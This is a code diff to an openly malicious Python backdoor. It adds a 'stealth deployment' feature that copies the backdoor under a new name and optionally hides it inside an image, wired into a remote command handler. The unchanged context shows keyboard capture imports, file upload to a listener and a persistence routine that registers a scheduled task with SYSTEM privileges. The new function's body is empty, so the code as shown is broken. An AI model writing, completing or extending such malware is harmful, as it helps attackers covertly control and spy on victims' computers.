@@ -15,6 +15,7 @@ import subprocess
 import base64
 import pynput
 import urllib.request
+
 from pynput import keyboard
 
 # If the free version of ngrok is used, the port will change each time ngrok is activated
@@ -265,7 +266,7 @@ def upload_file(filename, sock):
     sock.send(f"UPLOAD_ERR|{error_msg}".encode("utf-8"))
 
 ###
-### Persistence function
+### Persistence and Stealth
 ###
 
 # Installs persistence by creating a scheduled task that runs the backdoor at system startup with SYSTEM privileges.
@@ -297,6 +298,18 @@ def install_persistence(sock):
     error_msg = f"Persistence failed: {str(e)}"
     print(f"[!] {error_msg}")
     sock.send(f"PERSIST_ERR|{error_msg}".encode("utf-8"))
+
+# Deploys the backdoor in a stealthy manner by copying itself to a new location with a new name and optionally hiding it within a carrier image.
+# Preconditions: new_name, new_path, and carrier_img are provided, and sock is a connected socket.
+# Postconditions: The backdoor is copied to the new location, optionally hidden in a carrier image, and a success or error message is sent back to the listener.
+# Pseudocode:
+# 1. Determine the source path of the current executable
+# 2. Construct the destination path using new_path and new_name
+# 3. Copy the backdoor to the new location
+# 4. If carrier_img is provided, attempt to hide the backdoor within the image
+# 5. Send success or error message back to the listener
+def deploy_stealth(new_name, new_path, carrier_img, sock):
+  
 
 ###
 ### Command Handler
@@ -356,6 +369,19 @@ def command_handler(sock):
       # Persistence command
       elif cmd.startswith("PERSIST"):
         install_persistence(sock)
+
+      # Stealth deployment command
+      elif cmd.startswith("DEPLOY_STEALTH"):
+        parts = cmd.split(maxsplit=3)
+        if len(parts) < 4:
+          sock.send(b"STEALTH_ERR|Usage: DEPLOY_STEALTH <new_name> <target_dir> <carrier_image>")
+          return
+        
+        new_name = parts[1]
+        target_dir = parts[2]
+        carrier_img = parts[3]
+        
+        deploy_stealth(new_name, target_dir, carrier_img, sock)
 
       # Self destruct command
       elif cmd.startswith("KILL"):
